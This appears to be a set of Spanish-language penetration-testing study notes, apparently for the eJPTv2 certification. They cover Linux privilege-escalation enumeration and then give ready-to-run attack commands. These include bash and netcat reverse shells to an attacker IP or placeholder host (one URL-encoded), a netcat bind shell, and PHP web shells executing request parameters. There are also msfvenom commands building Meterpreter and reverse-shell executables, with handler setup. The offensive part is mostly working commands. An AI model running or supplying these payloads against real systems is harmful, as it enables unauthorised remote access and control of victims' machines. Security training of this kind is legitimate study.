---

---

------
## Enumeración una vez ganamos acceso para elevar privilegios

> Webs

- [GtfObins](https://gtfobins.github.io/)
- [HAcktricks](https://book.hacktricks.wiki/en/index.html)
- [IA - Hacktrics](https://www.hacktricks.ai/)


> Tools
- [LSE](https://github.com/diego-treitos/linux-smart-enumeration)
- [PSPY](https://github.com/DominicBreuker/pspy)

> Commands Para **SUID** para **SGID**
```bash
SGID
find / -perm -4000 -o -perm -2000 -exec ls -ld {} \; 2>/dev/null
SUID
find -perm -4000 -ls 2>/dev/null
AMBOS
ls -alh /path/to/check | grep 's'
``` 
> Commands para ver capabilities
> Podemos ver ciertas tareas privilegiadas con el user actual

```bash
getcap -r / 2>/dev/null
```

>Ver que tarea se ejecuta

- [PSPY](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64)

```bash
systemctl list-timers
```

>Ver que comando se  ejecuta  y que usuarios lo ejecutan

```bash
ps -eo command
ps -eo user,command
```

- Script --> [**currentcommand.sh**](D:\Training\eJPTv2\Payloads\currentcommandSystem.sh)
```bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Saliendo...\n"
	tput cnorm: exit 1 #Recuperar cursor
}

# Habilitar Ctrl+c
trap ctrl_c SIGINT

old_process=$(ps -eo user,command)

tput civis # Ocultar cursor

while true; do
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "command|kworker|procmon"
	old_process=$new_process
done
```
## Netcat - nc (también tenemos ncat, n.traditional)

> -e --> **esta flag coge el archivo a utilizar**

> -nvlp --> escucho a una IP, en modo verbose, a la escucha, por el puerto que le especifique

## Reverse shells

- [RevShell](https://www.revshells.com/)
- [Pentest Monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Buena Node.js Reverse](https://medium.com/dont-code-me-on-that/bunch-of-shells-nodejs-cdd6eb740f73)
- [Node.js](https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell) 

>En este caso mando una shell y me pongo a la escucha desde la ip atacante

 - **Desde máquina víctima**

```bash
nc -e /bin/bash ip_atacante 8080

/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.135/6501 0>&1'
bash -c 'bash -i >& /dev/tcp/ip_atacante/port 0>&1'
bash -c "bash -i >& /dev/tcp/ip_atacante/port 0>&1"
bash%20-c%20"bash%20-i%20>%26%20/dev/tcp/ip_atacante/port%200>%261"
bash -i >& /dev/tcp/ip_atacante/port 0>&1

# En meterpreter para estar más cómodos
/bin/bash -i
```

- Si tenemos una **rbash(restricted bash)** una vez hemos ganado acceso por ssh, únicamente poner bash al final
```bash
ssh user@IP bash
```

- **Desde máquina atacante**
```bash
rlwrap nc -nvlp 8080
```

- **Una vez estemos dentro**
```bash
script /dev/null -c bash
```


## Bind shell

> En este caso me pongo en esucha desde la víctima con una shell y desde mi consola me conecto
- **Desde máquina víctima**

```bash
nc -nvlp 4646 -e/bin/bash
```

- Desde máquina atacante
```bash
rlwrap nc ip_víctima 4646
```

## Forward Shell

> En este caso se bloquea el tráfico saliente  por lo que usaremos temo files para conseguir leer el output en otro archivo 

```bash
nano cmd.php
```

```php
<?
	echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

- Así consulto comandos en la web
http://192.168.1.135/cmd.php?cmd=whoami


- **Pero en este caso queremos una shell interactiva que nos han capado**

```php
<?php
	echo shell_exec($_REQUEST['cmd']);
?>
```




>Debemos ejecutar una revshell por el puerto 443
```bash
nc -e /bin/bash ip_atacante 443
```

>****Manda archivos temporales con la salida del comando ejecutado a nuetsrro PC, dejándolos en memoria e la máquina víctima y eliminando cualquier rastro****
	
[tty_over_http.py](https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py)

- **Simplemente ejecuto** `python3 tty_over_http.py` **y he ganado acceso sin necesidad de mandar una shell desde la víctima**
```bash
script /dev/null -c bash
```
## Payloads

#DiferenciasDePayloads

>La diferencia es la forma en que se envían por detrás, a la hora de utilizarlo no notaremos nada.
### Staged Payloads

- Se envía en diferentes fases
- Detección más difícil
- Mucho más pequeño

- Crear payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -- platform Windows -a x64 LHOST=ip_ataque LPORT=port_ataque -f exe -o shell.exe
```

>En **metasploit**

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
```
### Non-Staged Payloads

- Se envía de una sóla vez
- Es más grande

- Crear payload
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp --platform Windows -a x64 LHOST=ip_ataque LPORT=port_ataque -f exe -o shell.exe
```

>En **metasploit**

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
```

> **Sin Metasploit**

```bash
msfvenom -p windows/x64/shell_reverse_tcp --platform Windows -a x64 LHOST=ip_ataque LPORT=port_ataque -f exe -o shell.exe
```

```bash
rlwrap nc -nvlp port_ataque
```